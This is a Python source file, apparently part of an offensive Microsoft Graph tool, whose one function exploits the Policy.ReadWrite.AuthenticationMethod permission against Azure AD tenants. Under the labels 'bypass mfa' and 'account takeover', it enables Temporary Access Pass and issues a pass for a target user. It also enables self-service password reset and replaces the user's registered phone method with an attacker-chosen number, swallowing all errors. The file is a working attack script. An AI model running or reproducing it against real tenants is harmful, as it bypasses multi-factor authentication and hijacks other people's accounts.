import requests
import colorama
from colorama import Fore, Style


def PolicyUserAuthMethod_Vectors(request_headers, UserPolicyAuthSettings):
    print()
    print(
        "Policy.ReadWrite.AuthenticationMethod- Allows the app to read and write all authentication method policies for the tenant, without a signed-in user.")
    print()
    try:
        print("Attack vector - bypass mfa")

        create_message_URL = "https://graph.microsoft.com/v1.0/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/temporaryAccessPass"
        message_obj = {

         "lifetimeInMinutes": 60,
         "isUsableOnce": "true",
         "state":"enabled"

        }
        result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)

        if result.status_code == 204:
            create_message_URL = "https://graph.microsoft.com/v1.0/users/" +UserPolicyAuthSettings["UserId"] + "/authentication/temporaryAccessPassMethods"
            message_obj = {

                "lifetimeInMinutes": 60,
                "isUsableOnce": "true",
                "state": "enabled"

            }
            result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
            json = result.json()

            print(Fore.GREEN + "Temporary password is " + json["temporaryAccessPass"])
            print(Style.RESET_ALL)


        print("Attack vector - account takeover")

        create_message_URL = "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"
        message_obj = {
           "allowedToUseSSPR":"true"
        }
        result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)

        if result.status_code == 204:
            create_message_URL = "https://graph.microsoft.com/beta/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/sms"
            message_obj = {
                "@odata.type": "#microsoft.graph.temporaryAccessPassAuthenticationMethodConfiguration",
                "state":"enabled"
            }
            result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)

            if result.status_code == 204: # changed sms method

                create_message_URL = "https://graph.microsoft.com/v1.0/users/" + UserPolicyAuthSettings[
                    "UserId"] + "/authentication/phoneMethods"
                message_obj = {
                    "phoneNumber": UserPolicyAuthSettings["phone"],
                    "phoneType": "mobile"
                }
                result = requests.post(create_message_URL, json=message_obj, headers=request_headers)

                if result.status_code == 200:
                    print(Fore.GREEN + "changed the phone of  " + UserPolicyAuthSettings["UserId"])
                    print(Style.RESET_ALL)
                elif result.status_code == 400:

                    create_message_URL = "https://graph.microsoft.com/v1.0/users/" + UserPolicyAuthSettings[
                        "UserId"] + "/authentication/phoneMethods/3179e48a-750b-4051-897c-87b9720928f7"
                    message_obj = {
                        "phoneNumber": UserPolicyAuthSettings["phone"],
                        "phoneType": "mobile"
                    }
                    result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)

                    if result.status_code == 204:
                        print(Fore.GREEN + "changed the phone of  " + UserPolicyAuthSettings["UserId"])
                        print(Style.RESET_ALL)




    except:
        pass
